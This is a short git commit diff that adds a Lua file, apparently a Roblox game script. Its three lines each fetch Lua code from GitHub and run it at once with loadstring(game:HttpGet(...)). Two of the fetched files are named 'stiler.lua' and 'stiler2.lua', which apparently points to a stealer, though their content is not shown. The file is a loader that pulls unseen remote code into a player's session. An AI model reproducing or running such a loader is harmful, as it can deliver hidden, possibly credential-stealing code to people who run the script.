af6c5868ac9578aead4657dd6a93a733385b8ce2
Thunderxz <pbubos12@gmail.com>
2025-08-11 16:44:29 +0200

    Add files via upload

---
+++ Thunderx.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler2.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua'))()
